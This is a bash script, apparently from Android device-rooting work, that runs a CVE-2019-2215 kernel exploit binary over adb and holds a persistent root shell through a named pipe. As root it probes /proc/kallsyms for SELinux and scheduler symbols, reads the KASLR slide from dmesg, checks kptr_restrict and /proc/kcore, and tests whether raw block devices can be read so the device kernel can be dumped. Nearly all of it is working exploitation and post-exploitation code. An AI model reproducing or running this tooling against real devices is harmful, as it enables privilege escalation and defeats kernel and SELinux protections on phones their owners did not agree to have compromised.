#!/bin/bash
# Ask the device itself for the symbol addresses, now that we hold root + every
# capability. /proc/kallsyms was all zeros for the shell user; whether it is
# zeros for a fully-capable root depends on kptr_restrict, which we could not
# read earlier. One cheap test decides it.
#
# Also: cross-check the KASLR slide from dmesg (it prints "Kernel Offset"), and
# probe whether ANY block-device node is readable from this domain - if one is,
# we can dump the device's own kernel and stop guessing addresses entirely.
set -u

IN=/tmp/kall.in
OUT=/tmp/kall.out
EXP=/data/local/tmp/cve-2019-2215

echo "############ start a persistent root shell (the minimal-delta build wins reliably)"
rm -f "$IN" "$OUT"; mkfifo "$IN"; : > "$OUT"
adb shell "$EXP" < "$IN" >> "$OUT" 2>&1 &
EXPPID=$!
exec 9> "$IN"
for i in $(seq 1 120); do
  grep -aq "capabilities are overwritten" "$OUT" 2>/dev/null && { echo "  root after ${i}s"; break; }
  sleep 1
done
grep -aq "capabilities are overwritten" "$OUT" || { echo ">>> no root"; tail -5 "$OUT"; exit 1; }
sleep 3

runroot() {
  local MARK="MK$RANDOM$RANDOM" b
  b=$(wc -c < "$OUT")
  printf 'echo %s\n%s\necho %s\n' "$MARK" "$1" "$MARK" > "$IN"
  for i in $(seq 1 60); do
    sleep 1
    [ "$(tail -c +$((b+1)) "$OUT" | grep -ac "^$MARK$")" -ge 2 ] && break
  done
  tail -c +$((b+1)) "$OUT" | tr -d '\000' | awk -v m="$MARK" 'BEGIN{n=0}{if($0==m){n++;next} if(n==1)print}'
}

echo
echo "############ THE QUESTION: does kallsyms show real addresses to a capable root?"
runroot 'id | cut -c1-40; grep -E " (avc_cache|fair_sched_class|selinux_enforcing|selinux_state|kallsyms_offsets)$" /proc/kallsyms | head -8; echo "---"; head -3 /proc/kallsyms; echo "---"; grep -c . /proc/kallsyms'

echo
echo "############ cross-check: the real KASLR slide from dmesg"
runroot 'dmesg 2>/dev/null | grep -iE "kernel offset|randomize|kaslr" | head -5; echo "dmesg rc=$?"'
runroot 'dmesg 2>/dev/null | wc -l'

echo
echo "############ kptr_restrict, and whether /proc/kcore is openable"
runroot 'cat /proc/sys/kernel/kptr_restrict 2>&1; ls -la /proc/kcore 2>&1; dd if=/proc/kcore of=/dev/null bs=1 count=1 2>&1 | tail -1'

echo
echo "############ is ANY block device readable from this domain?"
runroot 'ls -laZ /dev/block/mmcblk0p30 /dev/block/mmcblk0p7 /dev/block/mmcblk0 2>&1 | head -6'
runroot 'for d in /dev/block/mmcblk0 /dev/block/mmcblk0p30 /dev/block/bootdevice/by-name/kernel; do printf "%s: " $d; dd if=$d of=/dev/null bs=512 count=1 2>&1 | tail -1; done'

echo
echo "### session left open; kill this script to end"
while kill -0 "$EXPPID" 2>/dev/null; do sleep 5; done
echo "### exploit exited"
exec 9>&-
